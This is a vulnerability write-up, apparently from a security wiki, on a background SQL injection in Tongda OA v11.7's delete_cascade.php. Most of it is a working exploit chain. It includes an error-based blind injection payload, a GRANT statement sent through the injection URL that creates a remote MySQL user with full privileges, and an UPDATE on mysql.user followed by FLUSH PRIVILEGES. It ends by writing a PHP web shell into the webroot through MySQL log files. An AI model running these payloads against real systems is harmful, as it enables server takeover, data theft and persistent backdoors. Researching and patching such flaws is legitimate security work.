# Tongda OA v11.7 delete_cascade.php background SQL injection

## Vulnerability Description

There is SQL injection in the background of Tongda OA v11.7, and you can write malicious backdoor files to attack the target server through this vulnerability.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Tongda OA v11.7</span>

## Environment construction

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Environmental address: https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe</span>

## Vulnerability reappears

In the `general/hr/manage/query/delete_cascade.php` file

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tongdaoa-3.png)

First, determine whether `$condition_cascade` is empty. If it is not empty, replace `\' with `'. 

`inc/common.inc.php` code

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tongdaoa-4.png)



Test SQL injection using blind annotation



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tongdaoa-5.png)



Triggered SQL injection interception of Tongda OA

The filtering mechanism is found in the `inc/conn.php` file as follows:

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tongdaoa-6.png)



It filters some characters, but it is not impossible to bypass. The core of blind accents is that functions such as `substr, if` are not filtered. So as long as MySQL is constructed, you can use the `if` function to blind accent. Looking through the sharing of the outsider's master at the White Hat Conference, I found that `power(9999,99)` can also cause the database to report an error, so the constructor statement:



```sql
select if((substr(user(),1,1)='r'),1,power(9999,99)) # 当字符相等时，不报错，错误时报错
```



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tongdaoa-7.png)



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tongdaoa-8.png)



Add SQL database user



```sql
grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION
```



Visit `https://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql. *TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION*



Enter the `Myoa/mysql5/bin` directory Execute `mysql -upeiqi -p` Enter your password to query all users



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tongdaoa-9.png)



Found that successful execution adds an account

Then the user has all permissions to the mysql database and then adds permissions to himself:



```sql
UPDATE `mysql`.`user` SET `Password` = '*FBCFBB73CF21D4F464A95E775B40AF27A679CD2D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('peiqi' AS Binary(5));
```



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tongdaoa-10.png)



Then use the injection point to refresh the permissions, because the user does not have the permission to refresh the permissions: `general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;`



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tongdaoa-11.png)

If login fails, execute

```sql
grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION
```

Write shells using vulnerabilities



```sql
# 查路径：
select @@basedir; # F:\OA\mysql5\，那么web目录就是 F:/OA/webroot/
# 方法1：
set global slow_query_log=on;
set global slow_query_log_file='F:/OA/webroot/';
select '<?php phpinfo();?>' or sleep(11);
# 方法2：
set global general_log = on;
set global general_log_file = 'F:/OA/webroot/';
select '<?php phpinfo();?>';
show variables like '%general%';
```



Upload Malaysia

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tongdaoa-12.png)